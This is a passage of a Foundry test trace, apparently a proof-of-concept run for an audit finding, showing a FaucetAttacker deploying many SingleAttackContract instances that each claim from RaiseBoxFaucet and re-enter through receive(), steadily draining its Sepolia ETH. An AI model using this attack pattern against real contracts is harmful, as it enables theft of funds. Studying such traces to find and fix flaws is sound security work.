    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 725000000000000000 [7.25e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x629713A726041A89b2D235b3a2E046cA6Ec69230
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 55) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9304028] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9303269] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9267101] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9259443] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 720000000000000000 [7.2e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x3bd227a5C61f9Ba2b486eCF1D1B5988A96526670
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 56) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9002059] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9001300] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8965132] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [8957474] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 715000000000000000 [7.15e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x25f6c35195a97b0932410E98b964A19b2Dd6A38d
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 57) [staticcall]
